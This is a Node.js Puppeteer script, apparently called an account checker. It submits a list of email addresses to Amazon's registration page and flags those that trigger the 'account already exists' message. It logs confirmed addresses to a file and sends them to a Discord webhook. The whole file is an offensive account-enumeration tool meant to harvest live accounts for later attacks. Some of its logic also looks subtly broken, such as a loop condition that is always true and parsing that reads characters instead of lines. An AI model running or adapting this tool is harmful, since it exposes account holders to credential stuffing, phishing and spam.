const puppeteer = require('puppeteer');
const fs = require('fs');
const {
    Webhook,
    MessageBuilder
} = require('discord-webhook-node');
let amznLink = "https://www.amazon.com/ap/register?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
let emailTable = []
const setTitle = require('node-bash-title');
setTitle('Account Checker by aaronn#4546');
let hooklink = ""

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function arrMail(data) {
    const arr = data.toString().replace(/\r\n/g, '\n')

    for (let i of arr) {
        if (i != "EmailAddress") {
            emailTable[emailTable.length] = i
        }
    }
};

function getRndInteger(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

async function start() {
    console.log("Launching Chromium...")
    let validAm = 0

    await sleep(1500)
    let data = fs.readFileSync('./elements/emails.txt', {
        encoding: 'utf8',
        flag: 'r'
    });
    await arrMail(data, (err) => {
        if (err) throw err;
    });

    async function isVisible(page, xPathSelector) {
        try {
            await page.waitForXPath(xPathSelector, {
                visible: true,
                timeout: 1000
            });
            return true;
        } catch {
            return false;
        }
    }

    async function removeone() {
        fs.readFile('./elements/emails.txt', (err, data) => {
            if (err) {
                throw err;
            }

            let fileRows = data.toString().split('\n');

            let firstRow = fileRows.shift();

            fileRows.push(firstRow);

            const fileData = new Uint8Array(Buffer.from(fileRows.join('\n')));

            fs.writeFile('./elements/emails.txt', fileData, (err) => {
                if (err) {
                    throw err;
                }

            });

        });
    }

    const browser = await puppeteer.launch({
        headless: true,
        ignoreHTTPSErrors: true
    });
    browser.currentPage = async function (browser, timeout) {
        let start = new Date().getTime();
        while (new Date().getTime() - start < timeout) {
            let pages = await browser.pages();
            let arr = [];
            for (const p of pages) {
                if (await p.evaluate(() => {
                        return document.visibilityState == 'visible'
                    })) {
                    arr.push(p);
                }
            }
            if (arr.length == 1) return arr[0];
        }
        throw "Unable to get active page";
    }
    let page = await browser.currentPage(browser, 1000, (err) => {
        if (err) throw err;
    });
    await page.setUserAgent('Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30')
    console.log("Chromium launched successfully! Starting Loop.")
    await sleep(1000)
    console.clear()
    console.log("If nothing appears on the console in > 5 seconds to load then please restart!")
    let checked = null
    for (let i = 0; i => emailTable.length; i++) {
        await page.goto(amznLink)
        try {
            await page.waitForSelector('input[name=email]')
            await page.waitForSelector('input[name=customerName]')
            await page.waitForSelector('input[name=password]')
            await page.type('input[name=customerName]', "aaronn#4546")
            await page.type('input[name=email]', emailTable[i].toLowerCase())
            await page.type('input[name=password]', "password")
            await page.waitForSelector('input[id=continue]')
            await page.click('input[id=continue]')
            await page.click('input[id=continue]')
            await sleep(750)
            try {
                const [getXpath] = await page.$x('/html/body/div[1]/div[2]/div[2]/div/div/div/ul/li/span')
                if (await page.$x('/html/body/div[1]/div[2]/div[2]/div/div/div/ul/li/span', {
                        timeout: 1000
                    })) {
                    if (await isVisible(page, "/html/body/div[1]/div[2]/div[2]/div/div/div/ul/li/span")) {
                        const message = await page.evaluate(name => name.textContent, getXpath);
                        if (message == ("\n            You indicated you're a new customer, but an account already exists with the email address " + emailTable[i].toLowerCase() + ".\n          ")) {
                            validAm++
                            console.log(`Valid Mail. Sent to Discord Webhook! Hit over ${validAm} mails!`)
                            checked = true
                            let hook = new Webhook(hooklink)
                            let embed = new MessageBuilder()
                                .setTitle('Valid Account found!')
                                .addField('Email Address', emailTable[i])
                            hook.send(embed)
                            await fs.appendFile('./elements/valid_emails.txt', emailTable[i] + '\n', (err) => {
                                if (err) throw err;
                            });
                            await removeone()
                        } else {
                            console.log('Invalid Mail!')
                            checked = true
                            await removeone()
                        }
                    }
                }
            } catch (error) {
                console.log("An execution error was experienced, most likely due to your Wi-Fi speed!")
                continue
            }
        } catch (err) {
            console.log("An execution error was experienced, most likely due to your Wi-Fi speed!")
            continue
        }
        setTitle(`Account Checker by aaronn#4546 ${i}/${emailTable.length}`);
    }
    process.exit()
}

console.clear()
start()
